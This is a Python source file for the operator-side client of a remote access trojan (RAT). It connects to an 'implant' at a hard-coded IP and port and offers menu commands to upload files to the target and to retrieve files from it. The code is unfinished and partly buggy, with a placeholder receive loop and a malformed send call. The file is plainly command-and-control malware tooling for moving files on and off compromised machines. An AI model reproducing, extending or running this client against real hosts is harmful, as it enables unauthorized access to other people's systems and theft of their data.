# Patrick Sacchet
# Version 1.0
# Serves as the main CMD client interface which will provide tasking to our RAT on target

import socket
import argparse
from RAT_Py_GetFile import *
#from scapy.all import * # switch from socket to scapy for custom TCP packets

SUCCESS = 1
FAILURE = 0

# Command values
EXIT = 0
PUT = 1
GET = 2

 # Change to flags for parser object
PORT_NUM = 1550
HOST = "192.168.111.128"

#-----------------------------------------------

#-----------------------------------------------
def printHelp():
    print("""Please select from the following options: \n
            1) Write a file to a location on target \n
            2) Get a file from a specific location on target\n
            0) Exit""")
    return SUCCESS

#-----------------------------------------------

#-----------------------------------------------
def doConnect():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((HOST, PORT_NUM))

    except Exception as e:
        print("ERROR: Could not connect to implant: ", e)
        return FAILURE

    return sock



#-----------------------------------------------

#-----------------------------------------------
def putFile(sock, filepath, filename, overwrite):
    try:
        # First tell our implant we want a PUT file performed
        sock.send(bytes(str(PUT), "utf-8"))
        # Send filepath
        sock.send(bytes(filepath), "utf-8")
        # Wait for response (should be success code)
        data = sock.recv(1024)
        print("Data received is %s\n" % data)

        # Placeholder - will continue reading data until... end code is sent?
        moreData = True
        while(moreData):
            sock.recv(1024)
            moreData = False


    except Exception as e:
        print("ERROR: Could not send put file to implant: ", e)
        return FAILURE
    return SUCCESS

#-----------------------------------------------

#-----------------------------------------------
def handleInput():
    print("Reaching out to agent for connection establishment...")
    sock = doConnect()
    print("Connected to agent at %s on port %d" % (sock.getpeername()[0], sock.getpeername()[1]))
    userInput = 1
    while (int(userInput) != EXIT):
        printHelp()


       

        
        userInput = input("> ")
        # add ip and port num to pass

        # Change this to parser object with ip and port specified
        if (int(userInput) == PUT):
            filepath= input("Please input filepath > ")
            filename = input("Please input filename (if not provided will use source file name) > ")
            overwrite = input("Would you like to overwrite existing file on target? > ")
            filepath = bytes(filepath, 'utf-8')
            filename = bytes(filename, 'utf-8')
            overwrite = bytes(overwrite, 'utf-8')

            putFile(sock, filepath, filename, overwrite)

        elif (int(userInput) == GET):

            user_input = input("> ")
             # play around with argparse 
            parser = argparse.ArgumentParser(description='Perform a get file off target')
            parser.add_argument('-filepath', '--filepath', type=str, help='Path to file to get on target', action='store', required=True)
            parser.add_argument('-outfilepath', '--outfilepath', type=str, help='Path to output file write on local machine', action='store', required=True)
            parser.add_argument('-overwrite','--overwrite', help="Whether to overwrite an existing file of the same name on the local machine", action='store_true', required=False)
            args = parser.parse_args(user_input.split())
            print(args)



            
            #filepath= input("Please input filepath > ")
            #outfilepath = input("Please input filename (if not provided will use source file name) > ")
            #overwrite = input("Would you like to overwrite existing file on host? > ")
            
            filepath = bytes(args.filepath, 'utf-8')
            outfilepath = args.outfilepath

            '''
            if (overwrite.lower() == "yes" or overwrite.lower() == "y"):
                overwrite = True
            else:
                overwrite = False
            '''
            if (args.overwrite):
                overwrite = True
            else:
                overwrite = False
            
            getFile(sock, filepath, outfilepath, overwrite)

    return

#-----------------------------------------------

#-----------------------------------------------
def main():
    handleInput()

    return SUCCESS

#-----------------------------------------------
if __name__ == '__main__':
    main()
